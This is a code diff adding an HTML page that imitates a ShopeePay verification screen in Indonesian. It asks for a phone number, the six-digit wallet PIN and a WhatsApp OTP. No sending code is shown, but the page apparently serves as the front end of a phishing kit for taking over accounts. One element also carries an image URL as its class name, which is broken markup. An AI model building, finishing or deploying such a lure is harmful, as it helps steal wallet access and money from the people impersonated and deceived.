@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi ShopeePay</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .header span {
+      font-size: 24px;
+      margin-right: 10px;
+      cursor: pointer;
+    }
+
+    h2 {
+      font-size: 18px;
+      margin: 0 0 10px;
+    }
+
+    p {
+      color: #333;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+
+    .input-group span {
+      margin-right: 10px;
+      color: #000;
+    }
+
+    .input-group input {
+      border: none;
+      outline: none;
+      font-size: 16px;
+      flex: 1;
+    }
+
+    .pin-input, .otp-input {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+
+    .pin-input input, .otp-input input {
+      width: 48px;
+      height: 60px;
+      font-size: 24px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #ee4d2d;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .resend {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .resend span {
+      color: #ee4d2d;
+      font-weight: bold;
+    }
+
+    .wa-icon {
+      color: green;
+      font-size: 32px;
+      text-align: center;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Form Nomor HP -->
+    <div id="form-phone">
+      <div class="header">
+        <span>&larr;</span>
+        <h2>Lanjut dengan Nomor Handphone</h2>
+      </div>
+      <p>Untuk mengidentifikasi akun ShopeePay Anda</p>
+      <div class="input-group">
+        <span>+62</span>
+        <input type="tel" placeholder="Masukkan nomor handphone" />
+      </div>
+      <button class="btn" onclick="showPIN()">Lanjut</button>
+    </div>
+
+    <!-- Form PIN -->
+    <div id="form-pin" class="hidden">
+      <div class="header">
+        <span onclick="backToPhone()">&larr;</span>
+        <h2>Masukkan PIN ShopeePay</h2>
+      </div>
+      <form onsubmit="showOTP(); return false;">
+        <div class="pin-input">
+          <input type="password" maxlength="1" />
+          <input type="password" maxlength="1" />
+          <input type="password" maxlength="1" />
+          <input type="password" maxlength="1" />
+          <input type="password" maxlength="1" />
+          <input type="password" maxlength="1" />
+        </div>
+        <button type="submit" class="btn">Lanjut</button>
+      </form>
+    </div>
+
+    <!-- Form OTP -->
+    <div id="form-otp" class="hidden">
+      <div class="header">
+        <span onclick="backToPIN()">&larr;</span>
+        <h2>Masukkan Kode Verifikasi</h2>
+      </div>
+      <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b>WhatsApp</b> ke</p>
+      <div class="https://th.bing.com/th/id/ODLS.50fab04a-0a4f-4927-bd9f-8da06c12d918?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2"></div>
+
+      <div class="otp-input">
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+      </div>
+
+      <button class="btn">Lanjut</button>
+
+      <div class="resend">
+        Mohon tunggu <span id="countdown">30</span> detik untuk mengirim ulang
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showPIN() {
+      document.getElementById("form-phone").classList.add("hidden");
+      document.getElementById("form-pin").classList.remove("hidden");
+    }
+
+    function showOTP() {
+      document.getElementById("form-pin").classList.add("hidden");
+      document.getElementById("form-otp").classList.remove("hidden");
+      startCountdown();
+    }
+
+    function backToPhone() {
+      document.getElementById("form-pin").classList.add("hidden");
+      document.getElementById("form-phone").classList.remove("hidden");
+    }
+
+    function backToPIN() {
+      document.getElementById("form-otp").classList.add("hidden");
+      document.getElementById("form-pin").classList.remove("hidden");
+    }
+
+    // Autofocus PIN & OTP
+    document.querySelectorAll('.pin-input input, .otp-input input').forEach((input, idx, arr) => {
+      input.addEventListener('input', () => {
+        if (input.value && idx < arr.length - 1) arr[idx + 1].focus();
+      });
+    });
+
+    // Countdown timer
+    function startCountdown() {
+      let timer = 30;
+      const countdown = document.getElementById('countdown');
+      countdown.textContent = timer;
+      const interval = setInterval(() => {
+        timer--;
+        countdown.textContent = timer;
+        if (timer <= 0) {
+          clearInterval(interval);
+          countdown.textContent = "0";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
